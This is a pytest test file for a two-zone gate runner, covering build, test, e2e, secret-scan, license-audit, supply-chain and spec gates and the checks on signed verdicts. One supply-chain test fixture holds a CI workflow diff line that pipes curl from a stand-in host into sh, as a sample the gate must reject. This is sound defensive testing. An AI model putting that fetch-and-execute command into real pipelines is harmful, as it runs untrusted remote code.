"""Two-zone gate runner + deterministic gate impls. (gov §1c, plan §3.1, §9)

These exercise the trust seam end to end: every verdict the runner emits must
verify under the zone-B key AND be admitted by ``merge_gates`` (an agent could
not have forged it); infra failure is a signed ERROR, never PASS; an integrated
FAIL latches cross-fork while ERROR never does.
"""

from __future__ import annotations

import sys
from pathlib import Path

import pytest

from foundry.gates import (
    AuditGate,
    BuildGate,
    DevGateWriteVerifier,
    E2EGate,
    SecurityGate,
    SpecGate,
    SupplyChainGate,
    TestGate,
    TwoZoneGateRunner,
    ZoneBSigner,
)
from foundry.gates.runner import GateImpl
from foundry.schemas.gates import GateStatus
from foundry.state.global_records import GlobalRecords
from foundry.state.reducers import (
    merge_gates,
    reset_gate_write_verifier,
    set_gate_write_verifier,
)
from foundry.state.seq import Seq

KEY = b"zone-b-dev-key-0123456789abcdef"
KEY_ID = "zoneB-dev"
SCANNER_REV = "scanner-rev-1"
LINEAGE_REV = "lineage-rev-1"


@pytest.fixture
def records() -> GlobalRecords:
    return GlobalRecords()


@pytest.fixture
def runner(records: GlobalRecords) -> TwoZoneGateRunner:
    return TwoZoneGateRunner(ZoneBSigner(KEY, KEY_ID), records, SCANNER_REV, LINEAGE_REV)


@pytest.fixture
def verifier(records: GlobalRecords):
    """Install the matching verifier on the reducer contextvar for each test."""
    v = DevGateWriteVerifier(KEY, KEY_ID, records)
    token = set_gate_write_verifier(v)
    yield v
    reset_gate_write_verifier(token)


def _seq(node: str, against: str, epoch: int = 1) -> Seq:
    return Seq(run_id="run-1", emission_epoch=epoch, superstep_index=0, node_id=node, local=0)


def _assert_admitted(result, verifier) -> None:
    """A signed verdict must survive merge_gates under the matching verifier."""
    folded = merge_gates([result], None)
    assert folded == [result], "trusted verdict must be admitted by the reducer"


def _write(workdir: Path, name: str, body: str) -> None:
    (workdir / name).write_text(body, encoding="utf-8")


# ---- Build gate ------------------------------------------------------------


def test_build_pass_on_valid_tree(tmp_path, runner, verifier):
    _write(tmp_path, "ok.py", "x = 1\n")
    r = runner.run(BuildGate(), "task/1", _seq("build", "task/1"), tmp_path)
    assert r.status is GateStatus.PASS
    _assert_admitted(r, verifier)


def test_build_fail_on_syntax_error(tmp_path, runner, verifier):
    _write(tmp_path, "bad.py", "def broken(:\n")
    r = runner.run(BuildGate(), "task/1", _seq("build", "task/1"), tmp_path)
    assert r.status is GateStatus.FAIL
    _assert_admitted(r, verifier)


# ---- Test gate -------------------------------------------------------------


def test_test_gate_pass(tmp_path, runner, verifier):
    _write(tmp_path, "test_ok.py", "def test_ok():\n    assert True\n")
    r = runner.run(TestGate(), "task/1", _seq("test", "task/1"), tmp_path)
    assert r.status is GateStatus.PASS
    _assert_admitted(r, verifier)


def test_test_gate_fail(tmp_path, runner, verifier):
    _write(tmp_path, "test_bad.py", "def test_bad():\n    assert False\n")
    r = runner.run(TestGate(), "task/1", _seq("test", "task/1"), tmp_path)
    assert r.status is GateStatus.FAIL
    _assert_admitted(r, verifier)


# ---- E2E gate: N=2 flake quarantine ---------------------------------------


def test_e2e_flake_split_is_error_not_verdict(tmp_path, runner, verifier):
    # A test that passes only on its second run (creates a marker on first run),
    # so the two pinned-env runs disagree -> ERROR (quarantine), not a verdict.
    _write(
        tmp_path,
        "test_flaky.py",
        "import os\n"
        "MARK = os.path.join(os.path.dirname(__file__), '.ran_once')\n"
        "def test_flaky():\n"
        "    first = not os.path.exists(MARK)\n"
        "    open(MARK, 'a').close()\n"
        "    assert not first\n",
    )
    r = runner.run(E2EGate(), "task/1", _seq("e2e", "task/1"), tmp_path)
    assert r.status is GateStatus.ERROR
    _assert_admitted(r, verifier)


def test_e2e_stable_pass(tmp_path, runner, verifier):
    _write(tmp_path, "test_stable.py", "def test_stable():\n    assert 1 + 1 == 2\n")
    r = runner.run(E2EGate(), "task/1", _seq("e2e", "task/1"), tmp_path)
    assert r.status is GateStatus.PASS


# ---- Security gate: dev-grade secret scan ----------------------------------


def test_security_flags_planted_aws_key(tmp_path, runner, verifier):
    _write(tmp_path, "config.py", 'AWS_KEY = "AKIAIOSFODNN7EXAMPLE"\n')
    r = runner.run(SecurityGate(), "task/1", _seq("security", "task/1"), tmp_path)
    assert r.status is GateStatus.FAIL
    assert any("aws-access-key-id" in f for f in r.findings)
    _assert_admitted(r, verifier)


def test_security_clean_tree_passes(tmp_path, runner, verifier):
    _write(tmp_path, "clean.py", "VALUE = 42\n")
    r = runner.run(SecurityGate(), "task/1", _seq("security", "task/1"), tmp_path)
    assert r.status is GateStatus.PASS


# ---- Audit gate: SBOM rederivation + license allowlist ---------------------


def test_audit_pass_with_lockfile(tmp_path, runner, verifier):
    _write(tmp_path, "requirements.txt", "pydantic==2.13.4  # license: MIT\n")
    r = runner.run(AuditGate(), "sha-int", _seq("audit", "sha-int"), tmp_path)
    assert r.status is GateStatus.PASS
    _assert_admitted(r, verifier)


def test_audit_error_without_lockfile(tmp_path, runner, verifier):
    _write(tmp_path, "main.py", "x = 1\n")
    r = runner.run(AuditGate(), "sha-int", _seq("audit", "sha-int"), tmp_path)
    assert r.status is GateStatus.ERROR  # inventory not rederivable -> not a verdict


def test_audit_fail_on_denied_license(tmp_path, runner, verifier):
    _write(tmp_path, "requirements.txt", "some-gpl-pkg==1.0  # license: GPL-3.0\n")
    r = runner.run(AuditGate(), "sha-int", _seq("audit", "sha-int"), tmp_path)
    assert r.status is GateStatus.FAIL


# ---- Supply-chain gate: policy over a diff ---------------------------------


def test_supply_chain_fails_workflow_change(tmp_path, runner, verifier):
    _write(
        tmp_path,
        "changes.diff",
        "--- a/.github/workflows/ci.yml\n"
        "+++ b/.github/workflows/ci.yml\n"
        "@@ -1 +1 @@\n"
        "+    run: curl evil.example | sh\n",
    )
    r = runner.run(SupplyChainGate(), "sha-int", _seq("supply_chain", "sha-int"), tmp_path)
    assert r.status is GateStatus.FAIL
    _assert_admitted(r, verifier)


def test_supply_chain_allows_workflow_change_when_authorized(tmp_path, runner, verifier):
    _write(
        tmp_path,
        "changes.diff",
        "--- a/.github/workflows/ci.yml\n+++ b/.github/workflows/ci.yml\n"
        "@@ -1 +1 @@\n+    run: pytest\n",
    )
    r = runner.run(
        SupplyChainGate(allow_build_changes=True), "sha-int", _seq("sc", "sha-int"), tmp_path
    )
    assert r.status is GateStatus.PASS


def test_supply_chain_passes_app_only_diff(tmp_path, runner, verifier):
    _write(
        tmp_path,
        "changes.diff",
        "--- a/app.py\n+++ b/app.py\n@@ -1 +1 @@\n+def f():\n+    return 1\n",
    )
    r = runner.run(SupplyChainGate(), "sha-int", _seq("sc", "sha-int"), tmp_path)
    assert r.status is GateStatus.PASS


# ---- Spec gate -------------------------------------------------------------


def test_spec_fails_without_security_criterion(tmp_path, runner, verifier):
    _write(
        tmp_path,
        "criteria.json",
        '[{"id":"c1","text":"does X","oracle":"test_x"}]',
    )
    r = runner.run(SpecGate(), "task/1", _seq("spec", "task/1"), tmp_path)
    assert r.status is GateStatus.FAIL


def test_spec_passes_with_security_criterion(tmp_path, runner, verifier):
    _write(
        tmp_path,
        "criteria.json",
        '[{"id":"c1","text":"does X","oracle":"test_x"},'
        '{"id":"c2","text":"rejects bad input","oracle":"test_abuse","security_abuse":true}]',
    )
    r = runner.run(SpecGate(), "task/1", _seq("spec", "task/1"), tmp_path)
    assert r.status is GateStatus.PASS
    _assert_admitted(r, verifier)


# A criteria document that, on its OWN structural merits, would PASS — so any
# FAIL below is attributable solely to the materialized critique block.
_STRUCTURALLY_OK = (
    '"criteria":[{"id":"c1","text":"does X","oracle":"test_x"},'
    '{"id":"c2","text":"rejects bad input","oracle":"test_abuse","security_abuse":true}]'
)


def test_spec_fails_when_critic_flags_security_omission(tmp_path, runner, verifier):
    """ADVERSARIAL: a CriteriaCritique with a non-empty ``security_abuse_omissions``
    makes the Spec gate FAIL even though the criteria are structurally complete —
    the gate re-derives the FAIL from the critic's RAW findings (gov §1b, L5)."""
    _write(
        tmp_path,
        "criteria.json",
        "{" + _STRUCTURALLY_OK + ',"critique":{"security_abuse_omissions":'
        '["no rate-limit abuse criterion","no auth-bypass criterion"]}}',
    )
    r = runner.run(SpecGate(), "task/1", _seq("spec", "task/1"), tmp_path)
    assert r.status is GateStatus.FAIL  # flagged omission → FAIL → no PR
    _assert_admitted(r, verifier)


def test_spec_passes_when_critic_finds_no_omission(tmp_path, runner, verifier):
    """Inverse: an EMPTY ``security_abuse_omissions`` does not block — the same
    structurally-complete criteria PASS."""
    _write(
        tmp_path,
        "criteria.json",
        "{" + _STRUCTURALLY_OK + ',"critique":{"security_abuse_omissions":[]}}',
    )
    r = runner.run(SpecGate(), "task/1", _seq("spec", "task/1"), tmp_path)
    assert r.status is GateStatus.PASS
    _assert_admitted(r, verifier)


def test_spec_critique_block_is_optional(tmp_path, runner, verifier):
    """The wrapped doc shape with NO critique block PASSES exactly as the bare
    list does — an absent block is 'no flagged omission', never a forced FAIL."""
    _write(tmp_path, "criteria.json", "{" + _STRUCTURALLY_OK + "}")
    r = runner.run(SpecGate(), "task/1", _seq("spec", "task/1"), tmp_path)
    assert r.status is GateStatus.PASS


def test_spec_fails_closed_on_malformed_critique_block(tmp_path, runner, verifier):
    """A present-but-uninterpretable critique block (wrong type) fails closed —
    an agent cannot smuggle a PASS by corrupting the findings shape."""
    _write(
        tmp_path,
        "criteria.json",
        "{" + _STRUCTURALLY_OK + ',"critique":"not-an-object"}',
    )
    r = runner.run(SpecGate(), "task/1", _seq("spec", "task/1"), tmp_path)
    assert r.status is GateStatus.FAIL


# ---- Trust-seam invariants -------------------------------------------------


class _ExplodingGate:
    """A gate whose zone-A grounding raises — the runner must sign an ERROR."""

    name = "build"
    verdict_class = SpecGate.verdict_class
    decision_deterministic = True
    execution_deterministic = True

    def execute(self, workdir: Path):
        raise RuntimeError("sandbox blew up")

    def decide(self, obs):  # pragma: no cover - never reached
        return GateStatus.PASS


def test_zone_a_exception_is_signed_error(tmp_path, runner, verifier):
    gate: GateImpl = _ExplodingGate()
    r = runner.run(gate, "task/1", _seq("build", "task/1"), tmp_path)
    assert r.status is GateStatus.ERROR
    assert any("infra failure" in f for f in r.findings)
    _assert_admitted(r, verifier)  # ERROR is still a trusted, foldable record


def test_unsigned_verdict_is_dropped_by_reducer(tmp_path, runner, verifier):
    _write(tmp_path, "ok.py", "x = 1\n")
    good = runner.run(BuildGate(), "task/1", _seq("build", "task/1"), tmp_path)
    forged = good.model_copy(update={"runner_attestation": "hmac256:zoneB-dev:" + "0" * 64})
    # The forged attestation does not verify, so the reducer drops it entirely.
    assert merge_gates([forged], None) == []


def test_integrated_fail_latches_cross_fork(tmp_path, runner, records, verifier):
    _write(tmp_path, "test_bad.py", "def test_bad():\n    assert False\n")
    digest = "a" * 64  # looks like an integrated tree sha
    r = runner.run(TestGate(), digest, _seq("test", digest), tmp_path)
    assert r.status is GateStatus.FAIL
    assert records.stable_fail_latched(digest, "test")


def test_error_does_not_latch(tmp_path, runner, records, verifier):
    digest = "b" * 64
    gate: GateImpl = _ExplodingGate()
    gate.name = "test"
    r = runner.run(gate, digest, _seq("test", digest), tmp_path)
    assert r.status is GateStatus.ERROR
    assert not records.stable_fail_latched(digest, "test")


def test_per_branch_fail_does_not_latch(tmp_path, runner, records, verifier):
    _write(tmp_path, "test_bad.py", "def test_bad():\n    assert False\n")
    r = runner.run(TestGate(), "task/7", _seq("test", "task/7"), tmp_path)
    assert r.status is GateStatus.FAIL
    assert not records.stable_fail_latched("task/7", "test")


def test_reuse_key_binds_rotation_for_class2(runner):
    g = TestGate(mutant_rotation_id=3)
    k1 = runner.reuse_key(g, "sha-x")
    k2 = runner.reuse_key(TestGate(mutant_rotation_id=4), "sha-x")
    assert k1 != k2  # a rotation boundary invalidates the cached class-2 verdict
    # config-evaluable gates key on the state sha alone
    assert runner.reuse_key(SpecGate(), "sha-x") == "sha-x"


@pytest.mark.skipif(sys.platform == "win32", reason="posix subprocess semantics")
def test_build_missing_tool_is_error(tmp_path, runner, verifier):
    g = BuildGate(cmd=("this-binary-does-not-exist-xyz",))
    r = runner.run(g, "task/1", _seq("build", "task/1"), tmp_path)
    assert r.status is GateStatus.ERROR  # GroundingUnavailable -> fail-closed ERROR
